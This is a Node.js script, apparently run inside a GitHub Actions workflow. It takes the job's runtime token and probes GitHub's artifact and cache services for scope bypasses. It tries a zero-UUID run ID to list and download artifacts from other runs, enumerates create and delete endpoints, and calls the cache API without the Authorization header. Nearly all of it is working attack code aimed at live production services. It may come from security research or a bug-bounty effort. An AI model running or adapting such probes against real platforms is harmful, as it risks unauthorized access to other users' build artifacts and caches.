const https = require('https');
const fs = require('fs');
const crypto = require('crypto');

const RESULTS_URL = process.env.ACTIONS_RESULTS_URL || '';
const RUNTIME_TOKEN = process.env.ACTIONS_RUNTIME_TOKEN || '';
const CACHE_URL = process.env.ACTIONS_CACHE_URL || '';

const outputFile = process.env.GITHUB_OUTPUT || '';
if (outputFile) {
  fs.appendFileSync(outputFile, `RESULTS_URL=${RESULTS_URL}\n`);
  fs.appendFileSync(outputFile, `TOKEN_PRESENT=${RUNTIME_TOKEN ? 'YES' : 'NO'}\n`);
}

function doRequest(options, body) {
  return new Promise((resolve) => {
    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => data += chunk);
      res.on('end', () => resolve({ status: res.statusCode, body: data.substring(0, 1000), headers: res.headers }));
    });
    req.on('error', (e) => resolve({ status: 'ERROR', body: e.message }));
    if (body) req.write(typeof body === 'string' ? body : JSON.stringify(body));
    req.end();
  });
}

async function main() {
  const ZERO_UUID = '00000000-0000-0000-0000-000000000000';

  if (RESULTS_URL && RUNTIME_TOKEN) {
    const host = new URL(RESULTS_URL).hostname;

    // Test: Does Actions.GenericRead:ZERO_UUID allow listing ALL artifacts?
    // The zero UUID in scp might mean "any run" (wildcard) for GenericRead
    console.log('=== Test: Zero-UUID GenericRead scope on ListArtifacts ===');
    const r1 = await doRequest({
      hostname: host,
      path: '/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts',
      method: 'POST',
      headers: { 'Authorization': 'Bearer ' + RUNTIME_TOKEN, 'Content-Type': 'application/json' }
    }, { workflowRunBackendId: ZERO_UUID });
    console.log('ListArtifacts(ZERO_UUID) → Status:', r1.status, '| Body:', r1.body);

    // Test: GetSignedArtifactURL with ZERO_UUID — does GenericRead scope bypass run-level scope?
    console.log('\n=== Test: GetSignedArtifactURL with ZERO_UUID ===');
    const r2 = await doRequest({
      hostname: host,
      path: '/twirp/github.actions.results.api.v1.ArtifactService/GetSignedArtifactURL',
      method: 'POST',
      headers: { 'Authorization': 'Bearer ' + RUNTIME_TOKEN, 'Content-Type': 'application/json' }
    }, { workflowRunBackendId: ZERO_UUID, name: 'probe-artifact-2' });
    console.log('GetSignedArtifactURL(ZERO_UUID) → Status:', r2.status, '| Body:', r2.body);

    // Test: What OTHER endpoints exist on results-receiver? Try common paths
    for (const endpoint of [
      '/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact',
      '/twirp/github.actions.results.api.v1.ArtifactService/DeleteArtifact',
      '/twirp/github.actions.results.api.v1.ArtifactService/FinalizeArtifact',
      '/api/v1/artifacts',
      '/v1/artifacts',
    ]) {
      const r = await doRequest({
        hostname: host, path: endpoint, method: 'POST',
        headers: { 'Authorization': 'Bearer ' + RUNTIME_TOKEN, 'Content-Type': 'application/json' }
      }, '{}');
      console.log(`\n${endpoint} → Status: ${r.status} | Body: ${r.body.substring(0, 100)}`);
    }
  }

  // Test cache service with correct headers (v6.0-preview.1 vs v6.0-preview)
  if (CACHE_URL && RUNTIME_TOKEN) {
    const cacheHost = new URL(CACHE_URL).hostname;
    const sessionPath = new URL(CACHE_URL).pathname;
    const cacheKey = 'test-key';
    const version = crypto.createHash('sha256').update(cacheKey).digest('hex');

    // Try without Accept version header (minimal headers)
    console.log('\n=== Cache service — minimal headers ===');
    const rC1 = await doRequest({
      hostname: cacheHost,
      path: sessionPath + '_apis/artifactcache/cache?keys=' + cacheKey + '&version=' + version,
      method: 'GET',
      headers: { 'Authorization': 'Bearer ' + RUNTIME_TOKEN }
    }, null);
    console.log('Cache(no Accept) → Status:', rC1.status, '| Body:', rC1.body.substring(0, 200));

    // Try with api-version=6.0-preview.1
    const rC2 = await doRequest({
      hostname: cacheHost,
      path: sessionPath + '_apis/artifactcache/cache?keys=' + cacheKey + '&version=' + version,
      method: 'GET',
      headers: {
        'Authorization': 'Bearer ' + RUNTIME_TOKEN,
        'Accept': 'application/json;api-version=6.0-preview.1',
      }
    }, null);
    console.log('Cache(preview.1) → Status:', rC2.status, '| Body:', rC2.body.substring(0, 200));

    // CRITICAL: Try calling cache API without Authorization (URL token IS the auth)
    const rC3 = await doRequest({
      hostname: cacheHost,
      path: sessionPath + '_apis/artifactcache/cache?keys=' + cacheKey + '&version=' + version,
      method: 'GET',
      headers: { 'Accept': 'application/json;api-version=6.0-preview' }
    }, null);
    console.log('Cache(no Auth header) → Status:', rC3.status, '| Body:', rC3.body.substring(0, 200));
  }
}

main().catch(e => console.log('Fatal error:', e.message));
